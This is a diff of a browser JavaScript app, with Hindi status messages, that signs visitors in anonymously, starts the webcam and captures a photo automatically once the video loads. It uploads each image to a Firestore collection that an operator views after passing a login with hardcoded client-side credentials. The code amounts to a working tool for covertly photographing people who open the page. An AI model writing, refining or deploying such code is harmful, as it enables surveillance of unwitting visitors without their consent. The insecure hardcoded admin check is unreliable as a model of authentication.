@@ -24,27 +24,21 @@ const captureButton = document.getElementById("capture-button");
 let userId = null;
 let hasAutoCaptured = false;
 
-// Anonymous login
-signInAnonymously(auth)
-  .then(() => {
-    userId = auth.currentUser?.uid || "anonymous";
-    status("विज़िटर ऑथ सफल।");
-    startCamera();
-  })
-  .catch(err => showError("अनाम ऑथ विफल: " + err.message));
+signInAnonymously(auth).then(() => {
+  userId = auth.currentUser?.uid || "anonymous";
+  status("विज़िटर ऑथ सफल।");
+  startCamera();
+}).catch(err => showError("Auth विफल: " + err.message));
 
 loginButton.addEventListener("click", () => {
-  const enteredId = (adminIdInput.value || "").trim();
-  const enteredPw = (adminPasswordInput.value || "").trim();
-
-  if (enteredId === ADMIN_ID && enteredPw === ADMIN_PASSWORD) {
+  if (adminIdInput.value === ADMIN_ID && adminPasswordInput.value === ADMIN_PASSWORD) {
     sessionStorage.setItem(LOGIN_KEY, "true");
     loginGate.classList.add("hidden");
     dashboardView.classList.remove("hidden");
     status("एडमिन लॉगिन सफल।");
     subscribePhotos();
   } else {
-    showError("गलत एडमिन ID या पासवर्ड।");
+    showError("गलत ID/पासवर्ड");
   }
 });
 
@@ -52,12 +46,10 @@ captureButton.addEventListener("click", async () => {
   await captureAndSave();
 });
 
-// ✅ नया कैमरा और ऑटो-कैप्चर logic
 async function startCamera() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     videoEl.srcObject = stream;
-
     videoEl.onloadedmetadata = () => {
       videoEl.play();
       autoCaptureOnce();
@@ -75,12 +67,41 @@ async function autoCaptureOnce() {
 
 async function captureAndSave() {
   try {
-    captureButton.disabled = true;
-    const w = videoEl.videoWidth || 640;
-    const h = videoEl.videoHeight || 480;
     const canvas = document.createElement("canvas");
-    canvas.width = w;
-    canvas.height = h;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(videoEl, 0, 0, w, h);
-    const base
+    canvas.width = videoEl.videoWidth;
+    canvas.height = videoEl.videoHeight;
+    canvas.getContext("2d").drawImage(videoEl, 0, 0);
+    const base64Image = canvas.toDataURL("image/jpeg", 0.8);
+
+    const photosRef = collection(db, "artifacts", "gcam-app", "users", STORAGE_ADMIN_ID, "captured_photos");
+    await addDoc(photosRef, {
+      base64Image,
+      timestamp: serverTimestamp(),
+      capturedBy: userId,
+      capturedAt: new Date().toLocaleString("hi-IN")
+    });
+
+    status("✅ फोटो सेव हो गई।");
+  } catch (err) {
+    showError("सेव विफल: " + err.message);
+  }
+}
+
+function subscribePhotos() {
+  const photosRef = collection(db, "artifacts", "gcam-app", "users", STORAGE_ADMIN_ID, "captured_photos");
+  const q = query(photosRef, orderBy("timestamp", "desc"));
+  onSnapshot(q, snap => {
+    imagesGrid.innerHTML = "";
+    snap.forEach(doc => {
+      const data = doc.data();
+      const img = document.createElement("img");
+      img.src = data.base64Image;
+      img.className = "w-full h-40 object-cover border";
+      imagesGrid.appendChild(img);
+    });
+  });
+}
+
+function status(msg) { statusMessage.textContent = msg; }
+function showError(msg) { errorText.textContent = msg; errorBox.classList.remove("hidden"); }
+window.closeErrorBox = () => errorBox.classList.add("hidden");
